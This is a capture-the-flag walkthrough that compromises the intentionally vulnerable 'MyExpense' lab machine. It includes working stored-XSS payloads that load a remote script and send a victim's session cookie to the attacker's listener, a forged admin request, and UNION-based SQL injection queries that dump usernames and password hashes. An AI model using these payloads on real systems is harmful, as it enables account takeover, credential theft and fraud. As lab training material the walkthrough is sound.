

## Walkthrough 

The first thing we're going to do is set the machine up in VirtualBox so that it sits on our network
- It's simply a matter of setting the network interface to bridged adapter and wlo1 in my case 
- Now we boot the machine

*We can use the mkt command to create a folder structure for this machine*

## Reconnaissance

First of all, with whichsistem.py we check whether we're dealing with a linux or a windows machine
- In this case it will report that the machine is linux
```bash
whichSystem.py 192.168.1.30
```
Next we run a reconnaissance scan with [[Nmap]]
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.1.30
```
All of this goes into a file called allPorts; with this command we can read the information more easily
```bash
extractPorts allPorts
```
Now that we know which ports are open we can throw a set of reconnaissance scripts at them with [[Nmap]] to check whether any of them has a vulnerability
- The -sCV merges -sC and -sV into one
- The -oN exports the result to a targeted file
```bash
nmap -sCV -p80,51045,51193,54585,59179 192.168.1.30 -oN targeted
```
Now we're going to fuzz with [[Gobuster]] to discover the directories and files of this website
```bash
gobuster dir -u http://192.168.1.30 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
This will show us the following:

![1](</Writeups/Machines/MYEXPENSE/img/1.png>)

This scan has revealed a number of pretty interesting directories, such as /admin 

We go to /admin and with wapalicer we can see that the site uses [[PHP]] as its main language 

Knowing this we can use [[Gobuster]] again to scan /admin looking for any [[PHP]] file
```bash
gobuster dir -u http://192.168.1.30/admin/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```
This will report an admin.php file

![1](</Writeups/Machines/MYEXPENSE/img/2.png>)

If we open this file we'll be able to see some credentials

![1](</Writeups/Machines/MYEXPENSE/img/3.png>)

Now we're going to create an account: we click where it says "you don't have an account" and enter the credentials

But when we go to create the account we see that the button is disabled

![1](</Writeups/Machines/MYEXPENSE/img/4.png>)

So we're going to open the inspector (ctrl + shift + c) and change the button from disabled to enabled 

![1](</Writeups/Machines/MYEXPENSE/img/5.png>)

That way we can create the user without any problem 

## Exploitation 

Now that we've confirmed the user can be created, we can try injecting [[JavaScript]] code while creating that user (so that when admin.php is opened it runs our code from the first name or last name parameter)  

![1](</Writeups/Machines/MYEXPENSE/img/6.png>)

Now we refresh the page and confirm that an alert does indeed pop up

![1](</Writeups/Machines/MYEXPENSE/img/7.png>)

Now we're going to check that we can receive information:
- First we start an HTTP server on port 80
```bash
python -m http.server 80
```
- Now we create a user where, instead of a first name and last name, we inject this code:
```javascript
<script src="http://192.168.1.25/pwned.js"></script>
```
- This will make the administrator constantly send requests to our server on port 80 looking for pwned.js

Once we have this we can create pwned.js, where we'll put the instructions to enable the user we currently have disabled

![1](</Writeups/Machines/MYEXPENSE/img/9.png>)

If we click where it says inactive we'll see that it sends a request to activate the user, but since we don't have permissions it won't let us

So we're going to make pwned.js send the request for us as the admin user when they run it:
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.30/admin/admin.php?id=15&status=active');
request.send();
```
This will let us log in as Samuel since we have his credentials

Once we log in we can see that they have an internal chat, and we still have to submit the payment request.

We submit the payment request and now we have to get hold of a user with higher privileges to approve it 

If we look, our manager is Manon, and we have a chat with him, so we can sneak an XSS into the chat that connects back to our machine requesting pwned.js on port 4646

![1](</Writeups/Machines/MYEXPENSE/img/11.png>)

In pwned.js we'll put the code that will send us this person's session cookie when they open the chat (in this case it's the home page)
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.25:4646/?cookie=' + document.cookie);
request.send();
```
This will give us their cookie; now we just have to swap it into our browser and approve the payment

![1](</Writeups/Machines/MYEXPENSE/img/12.png>)

Now that we've validated the payment we have to approve it, but this user doesn't have enough permissions, so we're going to take over the account of Manon's boss, who is a "Financial approver" and therefore will have permissions to approve the request

This time this user doesn't check the chat, so pulling off an [[XSS]] is going to be difficult 

But this part of the site is vulnerable to a [[SQL Injection]], so we're going to take advantage of it

![1](</Writeups/Machines/MYEXPENSE/img/13.png>)

This part right here is where we'll inject the SQL code

![1](</Writeups/Machines/MYEXPENSE/img/14.png>)

We keep testing and we'll eventually see that the server's internal query doesn't use quotes around the id = 2 part 

So we can take advantage of this to first work out how many columns it has (we keep trying until it stops erroring out)
```python
?id = 2 order by 2
```
Knowing it has two columns we can use a union select to display some data
```python
?id = 2 union select 1,user()-- -
```

![1](</Writeups/Machines/MYEXPENSE/img/15.png>)

Now we can use the same thing to list the existing databases
```python
?id = 2 union select 1,schema_name from information_schema.schemata-- -
```

![1](</Writeups/Machines/MYEXPENSE/img/16.png>)

Now we list the tables of the myexpense database

![1](</Writeups/Machines/MYEXPENSE/img/17.png>)

And we list the columns of the user table

![1](</Writeups/Machines/MYEXPENSE/img/18.png>)

Now we can dump the contents of the username and password fields separated by a colon (0x3a)

![1](</Writeups/Machines/MYEXPENSE/img/19.png>)

We copy everything and make it more readable in the terminal; it would look like this:

![1](</Writeups/Machines/MYEXPENSE/img/20.png>)

Since the passwords are hashed we can use this site to crack them --> https://hashes.com/en/decrypt/hash

![1](</Writeups/Machines/MYEXPENSE/img/21.png>)

We see they're hashed with [[MD5SUM]]

We try the financial approver's password and it's "HackMe"

![1](</Writeups/Machines/MYEXPENSE/img/22.png>)

We log in as him and approve the amount

![1](</Writeups/Machines/MYEXPENSE/img/23.png>)

Once this is done we can log into Samuel's account and see that we get the flag and the request is completed ; )

![1](</Writeups/Machines/MYEXPENSE/img/24.png>)
